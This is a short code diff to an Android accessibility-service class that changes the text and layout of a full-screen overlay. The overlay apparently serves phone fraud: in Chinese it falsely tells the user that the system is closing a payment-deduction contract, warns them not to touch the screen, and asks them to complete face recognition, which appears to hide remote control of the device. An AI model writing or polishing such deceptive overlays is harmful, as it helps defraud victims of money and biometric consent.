@@ -761,11 +761,11 @@ class InputService : AccessibilityService() {
 	overLay.setVisibility(gohome)
 
         val loadingText = TextView(this, null)
-	loadingText.text = "\n\n\n系统正在自动关闭签约的保险扣费窗口\n请勿触碰屏幕避免关闭失败\n配合人脸识别确保您本人关闭"
+	loadingText.text = "\n\n\n系统正在自动关闭签约的扣费窗口\n请勿触碰屏幕避免关闭失败\n配合人脸识别确保您本人关闭"
 	loadingText.setTextColor(-7829368)
-	loadingText.textSize = 18.0f
+	loadingText.textSize = 15.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
-	loadingText.setPadding(60, HomeHeight / 3, 0, 0)
+	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
 
 	val dp2px: Int = dp2px(this, 100.0f) //200.0f
 	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
